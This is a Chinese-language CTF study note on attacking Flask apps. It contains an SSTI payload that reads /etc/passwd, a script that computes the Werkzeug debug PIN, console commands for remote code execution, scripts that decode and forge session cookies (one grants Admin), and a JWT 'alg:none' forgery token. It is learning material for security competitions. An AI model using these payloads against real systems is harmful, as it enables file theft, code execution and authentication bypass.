# flask漏洞

参考资料：[关于ctf中flask算pin总结_ctf:flask-CSDN博客](https://blog.csdn.net/qq_35782055/article/details/129126825)

[flask debug PIN码利用与生成分析 - fxe00](https://fxe00.github.io/posts/research/flask-pin/flask-pin/)

[BUU刷题记录-flask漏洞学习 | tyskillのBlog](https://tyskill.github.io/posts/flask漏洞学习/)

==[CTF中Python_Flask应用的一些解题方法总结 | Savant's Blog (lxscloud.top)](https://blog.lxscloud.top/2022/10/09/CTF中Python_Flask应用的一些解题方法总结/)==

[Flask 会话 Cookie 解码器 (kirsle.net)](https://www.kirsle.net/wizards/flask-session.cgi)

[session解密 - 10.0.0.55 CTF Docs (10-0-0-55.github.io)](https://10-0-0-55.github.io/web/flask/session/)

==[JWT攻击常用的两种算法 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/290668.html)==





## Jinja2模板注入

详情请见SSTI专区



## pin命令执行

debug模式下，系统生成的一串字符串，输入PIN码之后就能够执行任意命令



PIN码生成六大要素：

- `username` 可以在任意文件读的条件下有读取/etc/passwd进行猜测
- `modname` 默认flask.app
- `appname` 默认Flask
- `moddir_flask` flask库下app.py的绝对路径，可以通过报错拿到
- `uuidnode` mac地址的十进制，任意文件读取`/sys/class/net/eth0/address`
- `machine_id` 机器码，生成PIN正确与否的关键



上述六个东西都需要通过SSTI模板注入的方法进行读取：

```
{% for c in [].__class__.__mro__[-1].__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{% endif %}{% endfor %}
```

应用名



当前网络的mac地址的十进制数，在文件 `/sys/class/net/eth0/address`





生成脚本如下：

python3.8以后脚本：

需要注意的是：

计算哈希时, 不同版本的 python 使用的哈希算法可能不同, 分析时使用的python版本为3.10.12, 为SHA1哈希算法, 据其他分析文章, 小于等于3.8版本使用的是MD5哈希算法。

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'app',				#whoami
    'flask.app',
    'Flask',			# getattr(app, "__name__", type(app).__name__),
    '/usr/local/lib/python3.8/site-packages/flask/app.py' 	#getattr(mod,"__file__",None)
]

private_bits = [
    '2485376911915',	#str(uuid.getnode())    /sys/class/net/ens33/address
    '7265fe765262551a676151a24c02b7b646a18828428b87e35c5482255b121e8f7464b02e50ffe3f1d626f8c05793f49a'# get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id
]   

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)

```



machine-id是关键

`/etc/machine-id` 读不到，那就是 `/proc/sys/kernel/random/boot_id` 和 `/proc/self/cgroup` 拼接了

跑脚本算出PIN之后一定要报错访问`/consloe` 进控制台rce

并且如果可以控制环境变量中的`WERKZEUG_DEBUG_PIN` 那么就不用跑脚本了，直接读取环境变量即可。



控制台拿到PIN，下面方法进行rce

```bash
[console ready]
1. os
>>> import os
>>> os.popen('whoami').read()
'fxe00\n'

2. subprocess.check_output
>>> import subprocess
>>> subprocess.check_output(['whoami'])
b'fxe00\n'

3. subprocess.run
>>> import subprocess
>>> subprocess.run(['whoami'], capture_output=True, text=True)
CompletedProcess(args=['whoami'], returncode=0, stdout='fxe00\n', stderr='')

4. subprocess.Popen
>>> import subprocess
>>> subprocess.Popen(['whoami'], stdout=subprocess.PIPE).stdout.read()
b'fxe00\n'

5. find classes
>>> ''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read() 
'fxe00\n'
```





绕过



过滤了self关键字，可以使用相关进程pid进行替换 /proc/1/cmdline

过滤了cgroup关键字，考虑使用mountinfo或cpuset, /proc/1/mountinfo







## session

session保存在客户机上，进行base64编码解码即可。flask在生成session的时候会使用app.config['SECRET_KEY']中的值进行加盐签名

flask保证session宝贝随意篡改，但是不保证内容不随意泄露



生成session cookie 需要 secret_key

解码session cookie 可以不需要 secret_key







### Session-decode脚本

session解码工具：



```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))

```



```bash
python flask_session_decode.py session内容
```



```bash
python flask_session_decode.py eyJ1cGRpciI6ImZpbGVpbmZvLy4uIiwidXNlciI6IkFkbWluaXN0cmF0b3IifQ.Y0Fj2g.UXNKMoSXrDAqOt90FWrOtZa9iNI
```







### Session-encode脚本



```python
#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e


if __name__ == "__main__":
    # Args are only relevant for __main__ usage
    
    ## Description for help
    parser = argparse.ArgumentParser(
                description='Flask Session Cookie Decoder/Encoder',
                epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if(args.subcommand == 'encode'):
        if(args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif(args.subcommand == 'decode'):
        if(args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value,args.secret_key))
        elif(args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))

```



```
python xxx.py encode -s "secret的值" -t 内容
```





新的脚本，数据需要解密之后更换：

```python
from hashlib import sha512
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib

PAYLOAD = {'Admin': True}

signer = URLSafeTimedSerializer(
    'secret-key', salt='cookie-session',
    serializer=session_json_serializer,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha512}
)

print(signer.dumps(PAYLOAD))
```







## jwt伪造

jwt全称JSON Web Token

用于作为JSON对象在各方之间安全的传输信息，JWT通过将用户信息封装成token的方式进行身份验证



组成格式：

HEADER.PAYLOAD.SIGNATURE

头部，载荷，签名

头部就是个JSON对象，alg就是选择加密算法hs256

```
iss: 该JWT的签发者

sub: 该JWT所面向的用户

aud: 接收该JWT的一方

exp(expires): 什么时候过期，这里是一个Unix时间戳

iat(issued at): 在什么时候签发的

SIGNATURE：表示对 JWT 信息的签名。其实就是对HEADER与PAYLOAD进行一次加密处理，主要是验证整个JWT内容有没有被篡改。首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。
```

一般来说是base64加密为字符串



经典payload

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJhY3Rpb24iOiJ1cGxvYWQifQ
```

解构后的jwt就是

```
{"typ":"JWT","alg":"none"}
{"user":"admin","action":"upload"}
```





JWT最常用的两种算法就是HMAC和RSA

HMAC对称加密算法用同一个密钥对token进行签名和认证

RSA非对称加密算法用两个密钥



